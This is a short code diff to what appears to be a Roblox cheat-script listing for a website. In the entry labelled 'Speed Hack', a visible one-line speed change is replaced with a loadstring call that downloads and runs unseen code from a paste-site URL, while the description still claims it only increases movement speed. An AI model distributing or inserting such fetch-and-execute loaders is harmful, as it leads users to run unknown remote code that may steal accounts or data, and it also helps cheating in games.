@@ -6,7 +6,7 @@ const scripts = [
     description: "Increases player movement speed.",
     image: "image/bloxfruits.png",
     code: `-- Speed Hack
-game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100`
+loadstring(game:HttpGet("https://pastefy.app/ACOX6D6h/raw"))()`
   },
   {
     id: "2",
